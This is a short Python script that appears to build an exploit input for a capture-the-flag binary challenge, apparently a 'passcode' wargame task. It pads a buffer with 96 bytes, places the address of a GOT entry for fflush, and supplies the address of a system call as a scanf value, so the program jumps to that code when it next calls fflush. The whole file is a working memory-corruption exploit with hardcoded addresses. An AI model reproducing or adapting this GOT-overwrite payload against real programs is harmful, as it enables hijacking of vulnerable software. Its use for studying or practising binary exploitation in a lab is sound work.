address_of_passcode2 = 0xfff5528c
# Address of flush in got.
address_of_got = 0x804a004
#0xfff55288
address_of_passcode1 = b"4294267528"

#0x080485d7
address_of_system_call = b"134514135"

# Welcome input
payload = b"a"*96
payload += (address_of_got).to_bytes(4, "little")
payload += b"\n"

# First scanf
payload += address_of_system_call
payload += b"\n"

# Second scanf.
# never really getting called.

with open("input", "wb") as output_file:
    output_file.write(payload)
